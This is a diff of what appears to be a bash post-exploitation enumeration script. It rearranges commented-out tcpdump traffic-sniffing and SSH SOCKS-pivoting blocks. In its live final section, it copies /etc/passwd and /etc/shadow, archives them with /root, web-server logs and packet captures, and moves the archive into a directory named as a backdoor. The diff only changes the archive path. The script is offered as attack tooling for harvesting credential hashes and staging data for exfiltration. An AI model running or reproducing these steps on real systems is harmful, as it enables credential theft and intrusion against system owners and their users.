@@ -298,6 +298,10 @@ route
 # echo -e "\n\nIs packet sniffing possible? What can be seen? Listen to live traffic\n" | tee -a $Err_Log
 
 # {
+# tcpdump tcp dst [IP] 80 and tcp dst [IP] 21
+# } >> $Enum_Report 2>>$Err_Log
+
+# {
 # tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 -w $Enum_Cap
 # } 2>>$Err_Log
 
@@ -332,21 +336,6 @@ route
 # ssh -D 127.0.0.1:9050 -N [username]@[ip]
 # proxychains ifconfig
 # } >> $Enum_Report 2>>$Err_Log
-
-
-###############################################################################################
-#                                                                                             #
-#                            Change [IP] to correct IP address                                #
-#                                                                                             #
-###############################################################################################
-
-# echo -e "\n\nIs packet sniffing possible? What can be seen? Listen to live traffic\n" | tee -a $Enum_Report
-# echo -e "\n\nIs packet sniffing possible? What can be seen? Listen to live traffic\n" | tee -a $Err_Log
-
-# {
-# tcpdump tcp dst [IP] 80 and tcp dst [IP] 21
-# } >> $Enum_Report 2>>$Err_Log
-
 
 
 ###############################################################################################
@@ -753,7 +742,7 @@ echo -e "\n\n\nThe End" | tee -a $Err_Log
 cp /etc/passwd ${Tmp_Space}/E_passwd
 cp /etc/shadow ${Tmp_Space}/E_shadow
 
-tar -cf ER.tar $Enum_Report $Enum_Log $Enum_Cap $Err_Log $Back_Door /var/log/apache2 /var/log/tomcat7 /root E_mail E_pass E_shadow
+tar -cf ER.tar $Enum_Report $Enum_Log $Enum_Cap $Err_Log ${Back_Door}/timecards /var/log/apache2 /var/log/tomcat7 /root E_mail E_pass E_shadow
 mv ER.tar ${Back_Door}/${Enum_Tar}
 
 rm -r /tmp/re-port
